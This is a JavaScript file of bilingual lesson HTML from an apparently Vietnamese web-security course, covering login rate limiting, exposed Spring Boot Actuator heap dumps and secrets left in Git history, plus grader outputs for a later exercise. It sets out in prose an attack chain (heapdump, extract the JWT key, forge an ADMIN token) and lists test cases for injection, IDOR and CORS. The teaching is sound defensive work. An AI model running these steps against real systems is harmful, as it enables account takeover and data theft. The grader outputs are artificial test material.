  <li><strong>Not only login.</strong> Registration, password reset, OTP checks, and expensive endpoints — lesson 10.3's <code>pg_sleep</code> showed a single search can hold a connection for a minute.</li>
</ul>

<h3>Part 2 — Actuator: the maintenance room</h3>
<p>Spring Boot Actuator exposes operational endpoints: health, metrics, configuration, request mappings, thread and heap dumps. A configuration that appears in countless tutorials:</p>
${PROPS105_LO}
<p>plus <code>.requestMatchers("/actuator/**").permitAll()</code> in the security chain "so Grafana can read metrics". One finding first: in Spring Boot 4.1.2, <code>include=*</code> alone listed 20 endpoints <em>without</em> heapdump, and <code>/actuator/heapdump</code> answered 404 "No static resource actuator/heapdump." — heap dumps need an explicit <code>access</code> setting. The second line above is what people copy to "fix" that 404. With it:</p>
${OUT105_LO}
<ul>
  <li><strong>21 endpoints</strong>, all anonymous. <code>/actuator/mappings</code> alone is a map of the API, including the forgotten <code>/v0</code> routes from lessons 10.1–10.3.</li>
  <li><code>/actuator/env</code> masks values (<code>"******"</code>): since Spring Boot 3, <code>show-values</code> defaults to <code>never</code>. That protection is real, and it is irrelevant once the heap dump is open.</li>
  <li>The heap dump is the JVM's memory: <strong>74 MB in under half a second</strong>. <code>strings</code> + <code>grep</code> finds the environment variables with their values — the JWT signing key and the first admin password (masked in this lesson, not in the file) — and a BCrypt hash that was in memory.</li>
  <li>With the signing key, the attacker signs his own token (<code>sub=admin</code>, <code>roles=[ADMIN]</code>) with a few lines of Node, exactly as lesson 9.3 did legitimately, and an admin-only request answers 200. Signature verification is working perfectly; the key is simply no longer secret.</li>
</ul>
${MA105_KY}

<h3>The fix: expose little, on a port the Internet cannot reach, behind a role</h3>
${PROPS105_DUNG}
<p>and in the chain: <code>/actuator/health</code> permitted, <code>/actuator/**</code> requires <code>ROLE_ADMIN</code>.</p>
${OUT105_DUNG}
<ul>
  <li>On the public port 8080 there is no Actuator any more. <code>/actuator/env</code> answers 401, not 404, because the security chain runs before routing: unknown paths are "authenticated" first.</li>
  <li>Port 8081 is the management server. In Docker or Kubernetes you simply do not publish it; the load balancer and Prometheus reach it on the internal network. Health is public there (status only); details and metrics need an ADMIN token.</li>
  <li>heapdump, env, configprops, mappings are not exposed at all. If you need a heap dump, take it on the machine with <code>jcmd &lt;pid&gt; GC.heap_dump</code> (lesson 2.6), not through HTTP.</li>
  <li>After a leak like this one: rotate the signing key (every token signed with the old key must stop working; a <code>kid</code> header makes rotation possible without downtime, lesson 9.3), change the admin password, and review what else was in memory.</li>
</ul>

<h3>Part 3 — a secret in Git history</h3>
<p>A developer commits <code>application.properties</code> with a real signing key, notices, and replaces it with <code>\${LABFLOW_JWT_SECRET}</code> in the next commit. The working tree is clean. Gitleaks scans the history:</p>
${OUT105_GIT}
<ul>
  <li>Two commits scanned, one leak: the <code>generic-api-key</code> rule found the key in the first commit (entropy 4.74). Anyone who clones the repository has it, forever.</li>
  <li>The only real fix is <strong>rotation</strong>: generate a new key, deploy it, and treat the old one as public. Rewriting history (<code>git filter-repo</code> + force push) is cosmetic once the repository has been cloned or mirrored, and must never come before rotation.</li>
  <li>Prevention: secrets only in environment variables or a secret manager; gitleaks as a pre-commit hook and in CI; GitHub push protection on the repository. This course's own repository runs gitleaks in CI — the rule <code>curl-auth-user</code> is why lessons write <code>curl -u an:$MAT_KHAU_AN</code> instead of a literal password.</li>
</ul>

<h3>🕵️ Hacker corner — Volkswagen (2024) and Uber (2016)</h3>
<p><strong>Volkswagen / Cariad, December 2024.</strong> Researchers of the Chaos Computer Club found that a Spring Boot application of Cariad, Volkswagen's software subsidiary, exposed its Actuator endpoints. The heap dump contained credentials for the company's cloud storage, which held months of precise location data of about 800,000 electric cars of several VW brands, linked to owners' names and contact details. They reported it; it was closed. The chain was exactly Part 2: open Actuator ⇒ heap dump ⇒ secrets in memory ⇒ real data.</p>
<p><strong>Uber, 2016.</strong> Attackers found AWS access keys in a private GitHub repository used by Uber engineers, used them to download data of 57 million riders and drivers from an S3 bucket, and demanded money. Uber paid $100,000 and hid the breach for a year, which later cost it a $148 million settlement and a criminal conviction of its former security chief. A secret in Git is a secret published to everyone who can read the repository — including the next attacker who steals one developer's token.</p>
<p><strong>What you do:</strong> limit login and other sensitive endpoints per account and per source; Actuator on a private port with a minimal exposure list; no heap dumps over HTTP; secrets outside the code, scanned in CI, rotated after any exposure.</p>

<h3>Compared with Node.js</h3>
<p><code>express-rate-limit</code> is the usual limiter, with the same in-memory caveat (use a Redis store with several instances) and the same proxy caveat (<code>app.set('trust proxy', 1)</code> only behind your own proxy). Node has no Actuator, but the equivalent mistakes exist: an exposed <code>--inspect</code> debugging port (full code execution), a <code>/debug</code> or <code>/metrics</code> route left public, and <code>.env</code> committed to Git — gitleaks catches that too.</p>

<h3>In real life and at work</h3>
<ul>
  <li>In a SWP391 demo the API often runs with <code>include=*</code> because a tutorial said so; check <code>/actuator</code> on your own deployment before the defence.</li>
  <li>Monitoring should pull metrics from the management port on the internal network, never through the public port with <code>permitAll</code>.</li>
  <li>When a secret leaks at work, the incident is not "delete the commit"; it is "rotate, check logs for use of the old secret, write it down".</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"How do you protect a login endpoint from brute force?"</strong> — Rate limit per account and per source (token bucket, 429 + Retry-After), strong hashing, MFA for sensitive roles, alerts; prefer slowing down to hard lockout.</li>
  <li><strong>"Which Actuator endpoints are dangerous?"</strong> — heapdump (memory with secrets), env and configprops (configuration), mappings and beans (reconnaissance), loggers (changing log levels), shutdown. Expose health/info/metrics only, on a separate port, behind authentication.</li>
  <li><strong>"Rate limiting with several instances?"</strong> — In-memory buckets multiply the budget; use a shared store such as Redis, or limit at the gateway.</li>
  <li><strong>"Someone committed a secret. What now?"</strong> — Rotate it immediately, check for misuse, then clean history if you want; add scanning so it cannot recur.</li>
  <li><strong>"Where do secrets live in a Spring Boot app?"</strong> — Environment variables or a secret manager (Vault, cloud secret stores), referenced as <code>\${VAR}</code>; never in the repository.</li>
</ol>

<h3>🧪 Practice (25 minutes)</h3>
<div class="callout ok"><ol>
  <li>With the Bucket4j filter on, predict how many 401 and 429 the 100-password loop gets, and whether it ever reaches line 87.</li>
  <li>Predict the result of 25 login attempts on 25 different accounts from one IP.</li>
  <li>With the <code>actdung</code> profile, predict the status of <code>/actuator/health</code>, <code>/actuator/env</code> and <code>/actuator/heapdump</code> on ports 8080 and 8081 without a token.</li>
  <li>Write the four steps you would take after gitleaks reports the finding above, in order.</li>
</ol>
<p><strong>Done when:</strong> your predictions match the outputs, and your steps start with rotating the key, include checking for use of the old key, and put any history rewrite last.</p></div>
${giai('Show the answers', `<p>5 × 401 and 95 × 429; line 87 is never tried. 20 × 401 then 5 × 429 (the per-IP bucket of 20). 8080: 404, 401, 401. 8081: 200, 401, 401. Steps: (1) generate and deploy a new signing key (old tokens stop validating; plan a <code>kid</code> for overlap), (2) search logs and data for use of the old key and invalidate refresh tokens, (3) move the value to an environment variable or secret manager and add gitleaks to pre-commit and CI, (4) optionally rewrite history and ask collaborators to re-clone.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Rate limiting</span><span class="v">Capping how many requests a client may make in a period; excess gets 429 Too Many Requests.</span></div>
  <div class="kv"><span class="k">Token bucket</span><span class="v">Algorithm: a bucket of N tokens refilled at a fixed rate; each request takes one.</span></div>
  <div class="kv"><span class="k">Password spraying</span><span class="v">Trying a few common passwords against many accounts to stay under per-account limits.</span></div>
  <div class="kv"><span class="k">Actuator</span><span class="v">Spring Boot module exposing operational endpoints (health, metrics, env, heapdump…).</span></div>
  <div class="kv"><span class="k">Management port</span><span class="v"><code>management.server.port</code>: Actuator on its own port, kept off the public network.</span></div>
  <div class="kv"><span class="k">Heap dump</span><span class="v">Snapshot of the JVM's memory, including every string the app holds.</span></div>
  <div class="kv"><span class="k">Secret rotation</span><span class="v">Replacing a key or password and invalidating the old one.</span></div>
  <div class="kv"><span class="k">gitleaks</span><span class="v">Scanner that finds secrets in files and in Git history.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>No limit: password found after 87 tries in 6.5 s. Bucket4j (5/min per name, 20/min per IP): 5 × 401, 95 × 429.</li>
  <li>Limit rather than lock; share buckets across instances; get the real client IP right.</li>
  <li>Open Actuator + heapdump: 74 MB in half a second ⇒ JWT key ⇒ forged ADMIN token ⇒ 200.</li>
  <li>Fix: health/info/metrics only, management port 8081 not published, ADMIN for the rest; no heap dumps over HTTP.</li>
  <li>A secret deleted in the next commit is still in history (gitleaks: 1 leak in 2 commits). Rotate first.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.spring.io/spring-boot/reference/actuator/endpoints.html', '🍃', 'Spring Boot — Actuator endpoints', 'Exposure, access levels, sanitization of values.')}
${tl('https://bucket4j.com/', '🪣', 'Bucket4j documentation', 'Bandwidths, refill strategies, distributed buckets with Redis.')}
${tl('https://github.com/gitleaks/gitleaks', '🔑', 'gitleaks', 'Rules, pre-commit hook, CI usage.')}
${tl('https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/', '🛡️', 'OWASP API4:2023 Unrestricted Resource Consumption', 'Rate limits and resource limits for APIs.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: <code>labflow.DemoApp</code> (<code>GioiHanDangNhap</code>, profiles <code>lo</code> and <code>actdung</code>), <code>node/ky.mjs</code> in <code>lab/c10</code>, Spring Boot 4.1.2, Bucket4j 8.14.0; gitleaks 8.30.1 (20/11/2026).</li>
  <li>Chaos Computer Club and Der Spiegel, 12/2024 (Cariad); US FTC and the Uber settlement records, 2017–2018.</li>
</ul>
</div>
`;

const L105_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.5</span>
<h2>Giới hạn tần suất, bí mật và lộ Actuator</h2>
<p class="lead">Ba lỗi không nằm trong controller nào: tuyến đăng nhập trả lời nhanh đúng bằng tốc độ bạn hỏi, một tuyến giám sát trao luôn bộ nhớ của ứng dụng, và một bí mật đã được "gỡ" khỏi mã nhưng chưa gỡ khỏi Git. Trong bài này một script tìm ra mật khẩu trong 6,5 giây, rồi đụng giới hạn Bucket4j sau năm lần thử; một bản heap dump 74 MB tải về không cần đăng nhập cho ra khoá ký JWT, và token giả ký bằng khoá đó mở được trang chỉ dành cho admin; còn gitleaks tìm ra một khoá trong commit không còn nằm trong cây thư mục hiện tại.</p>

<h3>Đời thường trước đã</h3>
<p>Cây ATM nuốt thẻ sau ba lần sai PIN, nên đoán một PIN 4 chữ số là vô vọng dù chỉ có 10.000 khả năng. Phòng kỹ thuật của toà nhà có tủ chứa mọi chìa khoá tổng; để nó mở "cho thợ tiện làm việc" là mở cùng lúc mọi văn phòng. Còn ghi mã két sắt vào cuốn sổ chung của văn phòng, rồi gạch đi ở trang sau, thì cũng không giúp gì: trang cũ vẫn nằm trong sổ.</p>

<h3>Phần 1 — tuyến đăng nhập trả lời mọi lần đoán</h3>
<p>Kẻ tấn công có danh sách 100 mật khẩu hay gặp cho An (trong demo, mật khẩu thật nằm ở dòng 87) và cứ thế thử:</p>
${OUT105_KHONG}
<p>86 lần sai, rồi trúng, trong 6,5 giây — khoảng 15 lần đoán mỗi giây từ một máy xách tay, dù BCrypt bắt mỗi lần kiểm tốn ~60 ms (bài 9.2). Tức 1,3 triệu lần đoán một ngày từ một client; tấn công thật dùng danh sách mật khẩu bị lộ và rất nhiều máy. Băm chậm bảo vệ chuỗi băm bị đánh cắp. Nó không bảo vệ tuyến đăng nhập.</p>

<h3>Giới hạn bằng Bucket4j: một xô theo tên đăng nhập, một xô theo IP</h3>
<p><em>Token bucket</em> (xô token) chứa N token; mỗi lần thử lấy một; token chảy lại theo tốc độ cố định. Xô cạn ⇒ 429. Hai xô vì có hai kiểu tấn công: đoán nhiều lần vào một tài khoản (xô theo tên, 5 lần/phút) và một máy thử vài mật khẩu trên nhiều tài khoản (xô theo IP, 20 lần/phút). Filter là một servlet filter thường đăng ký cho <code>/auth/login</code>, đứng TRƯỚC chuỗi Spring Security:</p>
${MA105_RL}
${OUT105_CO}
<ul>
  <li>Năm câu trả lời sai, rồi 95 lần từ chối. Mật khẩu thật ở dòng 87 không bao giờ được kiểm. Vòng lặp còn NHANH hơn (1,3 giây): một lần 429 không tốn BCrypt.</li>
  <li><code>Retry-After</code> báo cho client tử tế khi nào quay lại; thân phản hồi là ProblemDetail như phần còn lại của API.</li>
  <li>Rải tên — 25 tài khoản khác nhau, mỗi tài khoản một lần — lọt qua xô theo tên nhưng làm cạn xô theo IP sau 20 lần.</li>
</ul>
<p>Một lỗi ta gặp khi viết filter này, đáng biết: trước khi gọi <code>setCharacterEncoding("UTF-8")</code>, phản hồi thô đi ra dạng ISO-8859-1 và câu tiếng Việt tới nơi bị vỡ:</p>
${OUT105_CHARSET}
<p>Ghi thẳng vào response của servlet là đi vòng qua bộ chuyển đổi thông điệp của Spring, nên không có gì đặt bảng mã giúp bạn.</p>

<h3>Những lựa chọn thiết kế quanh giới hạn</h3>
<ul>
  <li><strong>Giới hạn, đừng khoá.</strong> Khoá tài khoản sau N lần sai cho phép bất kỳ ai khoá bất kỳ sinh viên nào vào đêm trước kỳ thi. Làm chậm theo tài khoản và theo nguồn; cảnh báo khi lưu lượng bất thường.</li>
  <li><strong>Bộ nhớ là của từng bản chạy.</strong> Các xô này sống trong một JVM. Ba bản chạy sau bộ cân bằng tải thì kẻ tấn công có gấp ba hạn mức, và khởi động lại là xoá sạch. Bucket4j giữ được xô trong Redis (Chương 13).</li>
  <li><strong>IP thật của client.</strong> Sau reverse proxy, <code>getRemoteAddr()</code> là IP của proxy cho mọi người — một xô IP cho cả trường. Cấu hình <code>server.forward-headers-strategy</code> và chỉ tin <code>X-Forwarded-For</code> từ proxy của chính bạn, không thì kẻ tấn công tự đặt header đó.</li>
  <li><strong>Không chỉ đăng nhập.</strong> Đăng ký, đặt lại mật khẩu, kiểm OTP, và các tuyến tốn kém — <code>pg_sleep</code> ở bài 10.3 cho thấy một lần tìm kiếm có thể giữ một kết nối cả phút.</li>
</ul>

<h3>Phần 2 — Actuator: căn phòng kỹ thuật</h3>
<p>Spring Boot Actuator mở các tuyến vận hành: health, metrics, cấu hình, bản đồ tuyến, thread dump và heap dump. Một cấu hình xuất hiện trong vô số bài hướng dẫn:</p>
${PROPS105_LO}
<p>cộng <code>.requestMatchers("/actuator/**").permitAll()</code> trong chuỗi bảo mật "để Grafana đọc số liệu". Một phát hiện trước đã: ở Spring Boot 4.1.2, chỉ <code>include=*</code> liệt kê 20 tuyến mà KHÔNG có heapdump, và <code>/actuator/heapdump</code> trả 404 "No static resource actuator/heapdump." — heap dump cần khai <code>access</code> tường minh. Dòng thứ hai ở trên là thứ người ta chép để "sửa" lỗi 404 đó. Có nó rồi:</p>
${OUT105_LO}
<ul>
  <li><strong>21 tuyến</strong>, đều ẩn danh. Riêng <code>/actuator/mappings</code> đã là bản đồ API, kể cả các tuyến <code>/v0</code> bị bỏ quên từ bài 10.1–10.3.</li>
  <li><code>/actuator/env</code> che giá trị (<code>"******"</code>): từ Spring Boot 3, <code>show-values</code> mặc định là <code>never</code>. Lớp bảo vệ đó có thật, và trở nên vô nghĩa khi heap dump đang mở.</li>
  <li>Heap dump là bộ nhớ của JVM: <strong>74 MB trong chưa tới nửa giây</strong>. <code>strings</code> + <code>grep</code> tìm ra biến môi trường kèm giá trị — khoá ký JWT và mật khẩu admin đầu tiên (bài này che bớt, tệp thì không) — và một chuỗi băm BCrypt đang nằm trong bộ nhớ.</li>
  <li>Có khoá ký, kẻ tấn công tự ký token (<code>sub=admin</code>, <code>roles=[ADMIN]</code>) bằng vài dòng Node, đúng như bài 9.3 làm một cách hợp lệ, và một request chỉ dành cho admin trả 200. Kiểm chữ ký vẫn chạy hoàn hảo; chỉ là khoá không còn bí mật.</li>
</ul>
${MA105_KY}

<h3>Cách vá: mở ít, trên cổng Internet không với tới, sau một vai trò</h3>
${PROPS105_DUNG}
<p>và trong chuỗi: <code>/actuator/health</code> cho phép, <code>/actuator/**</code> cần <code>ROLE_ADMIN</code>.</p>
${OUT105_DUNG}
<ul>
  <li>Trên cổng công khai 8080 không còn Actuator. <code>/actuator/env</code> trả 401 chứ không phải 404, vì chuỗi bảo mật chạy trước bước định tuyến: đường lạ bị "đòi xác thực" trước.</li>
  <li>Cổng 8081 là management server. Trong Docker hay Kubernetes bạn đơn giản là không công bố nó ra ngoài; bộ cân bằng tải và Prometheus với tới nó qua mạng nội bộ. Ở đó health công khai (chỉ trạng thái); chi tiết và metrics cần token ADMIN.</li>
  <li>heapdump, env, configprops, mappings hoàn toàn không được mở. Cần heap dump thì lấy ngay trên máy bằng <code>jcmd &lt;pid&gt; GC.heap_dump</code> (bài 2.6), không qua HTTP.</li>
  <li>Sau một vụ lộ như thế này: xoay khoá ký (mọi token ký bằng khoá cũ phải hết hiệu lực; header <code>kid</code> giúp xoay khoá không gián đoạn, bài 9.3), đổi mật khẩu admin, và xem lại còn gì khác nằm trong bộ nhớ.</li>
</ul>

<h3>Phần 3 — bí mật trong lịch sử Git</h3>
<p>Một lập trình viên commit <code>application.properties</code> có khoá ký thật, nhận ra, và thay bằng <code>\${LABFLOW_JWT_SECRET}</code> ở commit kế tiếp. Cây thư mục sạch. Gitleaks quét lịch sử:</p>
${OUT105_GIT}
<ul>
  <li>Quét hai commit, một chỗ lộ: luật <code>generic-api-key</code> tìm thấy khoá trong commit đầu (entropy 4,74). Ai clone kho này đều có nó, mãi mãi.</li>
  <li>Cách vá thật duy nhất là <strong>xoay khoá</strong>: sinh khoá mới, triển khai, và coi khoá cũ là công khai. Viết lại lịch sử (<code>git filter-repo</code> + force push) chỉ là trang điểm khi kho đã bị clone hay nhân bản, và không bao giờ được làm trước bước xoay khoá.</li>
  <li>Phòng ngừa: bí mật chỉ ở biến môi trường hoặc trình quản lý bí mật; gitleaks làm pre-commit hook và chạy trong CI; bật push protection của GitHub cho kho. Kho của chính khoá học này chạy gitleaks trong CI — luật <code>curl-auth-user</code> là lý do bài học viết <code>curl -u an:$MAT_KHAU_AN</code> thay vì một mật khẩu viết thẳng.</li>
</ul>

<h3>🕵️ Góc hacker — Volkswagen (2024) và Uber (2016)</h3>
<p><strong>Volkswagen / Cariad, tháng 12/2024.</strong> Nhóm nghiên cứu của Chaos Computer Club phát hiện một ứng dụng Spring Boot của Cariad, công ty phần mềm con của Volkswagen, mở các tuyến Actuator. Heap dump chứa thông tin đăng nhập vào kho lưu trữ đám mây của công ty, nơi giữ nhiều tháng dữ liệu vị trí chính xác của khoảng 800.000 xe điện thuộc nhiều thương hiệu VW, gắn với tên và thông tin liên lạc của chủ xe. Họ báo cáo; lỗ được đóng. Chuỗi tấn công đúng y Phần 2: Actuator mở ⇒ heap dump ⇒ bí mật trong bộ nhớ ⇒ dữ liệu thật.</p>
<p><strong>Uber, 2016.</strong> Kẻ tấn công tìm thấy khoá truy cập AWS trong một kho GitHub riêng tư mà kỹ sư Uber dùng, lấy chúng tải dữ liệu của 57 triệu hành khách và tài xế từ một bucket S3, rồi đòi tiền. Uber trả 100.000 USD và giấu vụ việc suốt một năm, sau đó phải dàn xếp 148 triệu USD và cựu giám đốc an ninh bị kết án hình sự. Bí mật trong Git là bí mật đã công bố cho mọi người đọc được kho — kể cả kẻ tấn công tiếp theo đánh cắp được token của một lập trình viên.</p>
<p><strong>Bạn làm gì:</strong> giới hạn đăng nhập và các tuyến nhạy cảm theo tài khoản và theo nguồn; Actuator trên cổng riêng với danh sách mở tối thiểu; không heap dump qua HTTP; bí mật nằm ngoài mã, được quét trong CI, và xoay ngay sau mọi lần lộ.</p>

<h3>So với Node.js</h3>
<p><code>express-rate-limit</code> là bộ giới hạn hay dùng, cùng lưu ý về bộ nhớ (nhiều bản chạy thì dùng kho Redis) và cùng lưu ý về proxy (<code>app.set('trust proxy', 1)</code> chỉ khi đứng sau proxy của bạn). Node không có Actuator, nhưng có những lỗi tương đương: cổng gỡ lỗi <code>--inspect</code> bị mở (chạy được mọi mã), tuyến <code>/debug</code> hay <code>/metrics</code> để công khai, và <code>.env</code> bị commit vào Git — gitleaks cũng bắt được.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li>Khi demo SWP391, API thường chạy với <code>include=*</code> vì bài hướng dẫn bảo thế; kiểm <code>/actuator</code> trên bản triển khai của chính bạn trước buổi bảo vệ.</li>
  <li>Hệ thống giám sát nên kéo số liệu từ cổng quản trị qua mạng nội bộ, không bao giờ qua cổng công khai với <code>permitAll</code>.</li>
  <li>Khi lộ bí mật ở công ty, xử lý sự cố không phải là "xoá commit"; mà là "xoay khoá, xem log có ai dùng khoá cũ không, ghi biên bản".</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Bảo vệ tuyến đăng nhập khỏi dò mật khẩu thế nào?"</strong> — Giới hạn tần suất theo tài khoản và theo nguồn (token bucket, 429 + Retry-After), băm mạnh, MFA cho vai trò nhạy cảm, cảnh báo; ưu tiên làm chậm hơn là khoá cứng.</li>
  <li><strong>"Tuyến Actuator nào nguy hiểm?"</strong> — heapdump (bộ nhớ chứa bí mật), env và configprops (cấu hình), mappings và beans (do thám), loggers (đổi mức log), shutdown. Chỉ mở health/info/metrics, trên cổng riêng, sau xác thực.</li>
  <li><strong>"Giới hạn tần suất khi có nhiều bản chạy?"</strong> — Xô trong bộ nhớ nhân hạn mức lên; dùng kho chung như Redis, hoặc giới hạn ở gateway.</li>
  <li><strong>"Có người commit một bí mật. Giờ làm gì?"</strong> — Xoay nó ngay, kiểm xem có bị dùng không, rồi dọn lịch sử nếu muốn; thêm bước quét để không tái diễn.</li>
  <li><strong>"Bí mật của ứng dụng Spring Boot nằm ở đâu?"</strong> — Biến môi trường hoặc trình quản lý bí mật (Vault, kho bí mật của đám mây), tham chiếu bằng <code>\${VAR}</code>; không bao giờ trong kho mã.</li>
</ol>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok"><ol>
  <li>Khi bật filter Bucket4j, đoán vòng lặp 100 mật khẩu nhận bao nhiêu 401 và 429, và có bao giờ tới dòng 87 không.</li>
  <li>Đoán kết quả của 25 lần đăng nhập vào 25 tài khoản khác nhau từ một IP.</li>
  <li>Với profile <code>actdung</code>, đoán mã trạng thái của <code>/actuator/health</code>, <code>/actuator/env</code>, <code>/actuator/heapdump</code> trên cổng 8080 và 8081 khi không có token.</li>
  <li>Viết bốn bước bạn sẽ làm sau khi gitleaks báo chỗ lộ ở trên, theo đúng thứ tự.</li>
</ol>
<p><strong>Đạt khi:</strong> các dự đoán khớp output, và các bước của bạn mở đầu bằng xoay khoá, có bước kiểm khoá cũ có bị dùng không, và để việc viết lại lịch sử ở cuối.</p></div>
${giai('Xem đáp án', `<p>5 × 401 và 95 × 429; dòng 87 không bao giờ được thử. 20 × 401 rồi 5 × 429 (xô theo IP 20 lượt). 8080: 404, 401, 401. 8081: 200, 401, 401. Các bước: (1) sinh và triển khai khoá ký mới (token cũ hết hợp lệ; tính trước <code>kid</code> để chuyển tiếp), (2) tìm trong log và dữ liệu dấu vết dùng khoá cũ, vô hiệu hoá refresh token, (3) chuyển giá trị sang biến môi trường hoặc trình quản lý bí mật và thêm gitleaks vào pre-commit và CI, (4) tuỳ chọn viết lại lịch sử và báo đồng đội clone lại.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Giới hạn tần suất</span><span class="v">Chặn số request một client được gửi trong một khoảng thời gian; vượt thì nhận 429 Too Many Requests.</span></div>
  <div class="kv"><span class="k">Token bucket</span><span class="v">Thuật toán: xô N token được nạp lại với tốc độ cố định; mỗi request lấy một token.</span></div>
  <div class="kv"><span class="k">Password spraying</span><span class="v">Thử vài mật khẩu phổ biến trên rất nhiều tài khoản để lọt dưới giới hạn theo tài khoản.</span></div>
  <div class="kv"><span class="k">Actuator</span><span class="v">Mô-đun Spring Boot mở các tuyến vận hành (health, metrics, env, heapdump…).</span></div>
  <div class="kv"><span class="k">Cổng quản trị</span><span class="v"><code>management.server.port</code>: Actuator chạy cổng riêng, không đưa ra mạng công khai.</span></div>
  <div class="kv"><span class="k">Heap dump</span><span class="v">Ảnh chụp bộ nhớ của JVM, gồm mọi chuỗi ứng dụng đang giữ.</span></div>
  <div class="kv"><span class="k">Xoay bí mật</span><span class="v">Thay khoá hoặc mật khẩu và vô hiệu hoá cái cũ.</span></div>
  <div class="kv"><span class="k">gitleaks</span><span class="v">Công cụ quét tìm bí mật trong tệp và trong lịch sử Git.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Không giới hạn: tìm ra mật khẩu sau 87 lần thử trong 6,5 giây. Bucket4j (5/phút theo tên, 20/phút theo IP): 5 × 401, 95 × 429.</li>
  <li>Giới hạn thay vì khoá; dùng chung xô giữa các bản chạy; lấy đúng IP thật của client.</li>
  <li>Actuator mở + heapdump: 74 MB trong nửa giây ⇒ khoá JWT ⇒ token ADMIN giả ⇒ 200.</li>
  <li>Vá: chỉ health/info/metrics, cổng quản trị 8081 không công bố, phần còn lại cần ADMIN; không heap dump qua HTTP.</li>
  <li>Bí mật xoá ở commit sau vẫn nằm trong lịch sử (gitleaks: 1 chỗ lộ trong 2 commit). Xoay khoá trước tiên.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.spring.io/spring-boot/reference/actuator/endpoints.html', '🍃', 'Spring Boot — Actuator endpoints', 'Mở tuyến, mức truy cập, che giá trị.')}
${tl('https://bucket4j.com/', '🪣', 'Tài liệu Bucket4j', 'Bandwidth, chiến lược nạp lại, xô phân tán với Redis.')}
${tl('https://github.com/gitleaks/gitleaks', '🔑', 'gitleaks', 'Luật, pre-commit hook, dùng trong CI.')}
${tl('https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/', '🛡️', 'OWASP API4:2023 Unrestricted Resource Consumption', 'Giới hạn tần suất và tài nguyên cho API.')}

<h3>Nguồn</h3>
<ul>
  <li>Output trong bài: <code>labflow.DemoApp</code> (<code>GioiHanDangNhap</code>, profile <code>lo</code> và <code>actdung</code>), <code>node/ky.mjs</code> ở <code>lab/c10</code>, Spring Boot 4.1.2, Bucket4j 8.14.0; gitleaks 8.30.1 (20/11/2026).</li>
  <li>Chaos Computer Club và Der Spiegel, 12/2024 (Cariad); hồ sơ FTC và các thoả thuận dàn xếp của Uber, 2017–2018.</li>
</ul>
</div>
`;

// ===== Bài 10.6 =====
const OUT106_STARTER = out("FAIL 1 mass assignment — CSDL: ADMIN|Lan Nguyen|{noop}x · phản hồi: {\"avatarUrl\":null,\"displayName\":\"Lan Nguyen\",\"id\":2,\"passwordHash\":\"{noop}x\",\"role\":\"ADMIN\",\"studentId\":1,\"username\":\"SE\nFAIL 2 IDOR — Lan xem 200 · Lan huỷ 200 · An xem 200 · trạng thái CANCELLED\nFAIL 3 BFLA — An tự duyệt 200 · ADMIN 200\nFAIL 4 injection — PENDING ⇒ 1 · tiêm ⇒ HTTP 200, 30 dòng · pg_sleep 2.065802s\nFAIL 5 CORS — labflow.vn ⇒ 'https://labflow.vn' · evil.example ⇒ 'https://evil.example' · evil-labflow.vn ⇒ 'https://evil-labflow.vn'\nFAIL 6 Actuator — health UP: 1 · còn mở: 8080/env 8080/env(SV) 8080/heapdump 8080/heapdump(SV) 8080/configprops 8080/configprops(SV) 8080/mappings 8080/mappings(SV)\nFAIL 7 giới hạn — 10 lượt: 401 401 401 401 401 401 401 401 401 401 · Retry-After: 0 · Lan đăng nhập 200\nPASS 8 luồng đúng: GET /labs, đặt phòng, GET /me, danh sách của mình\nĐIỂM: 1/8");
const OUT106_GIAI = out("PASS 1 PATCH /me: role/passwordHash bị bỏ qua hoặc 400, tên hiển thị vẫn sửa được, phản hồi không lộ băm\nPASS 2 Lan xem/huỷ lượt 18 của An ⇒ 403/404; An xem được\nPASS 3 duyệt: sinh viên 403 (kể cả chủ lượt đặt), ADMIN 200\nPASS 4 /bookings/search: PENDING ⇒ 1 lượt của mình; chuỗi tiêm ⇒ 400 / 0 dòng; pg_sleep ⇒ 0.006872s\nPASS 5 CORS: labflow.vn được phép; evil.example và evil-labflow.vn không nhận Access-Control-Allow-Origin\nPASS 6 Actuator: health UP; env/heapdump/configprops/mappings không mở cho khách lẫn sinh viên\nPASS 7 dò mật khẩu SE180124 ⇒ 429 + Retry-After; Lan vẫn đăng nhập được\nPASS 8 luồng đúng: GET /labs, đặt phòng, GET /me, danh sách của mình\nĐIỂM: 8/8");
const OUT106_BAY_CORS = out("FAIL 5 CORS — labflow.vn ⇒ 'https://labflow.vn' · evil.example ⇒ '' · evil-labflow.vn ⇒ 'https://evil-labflow.vn'\nĐIỂM: 7/8");
const OUT106_BAY_ACT = out("FAIL 6 Actuator — health UP: 1 · còn mở: 8080/env(SV) 8080/heapdump(SV) 8080/configprops(SV) 8080/mappings(SV)\nĐIỂM: 7/8");
const OUT106_BAY_HUY = out("FAIL 2 IDOR — Lan xem 403 · Lan huỷ 200 · An xem 200 · trạng thái CANCELLED\nĐIỂM: 7/8");
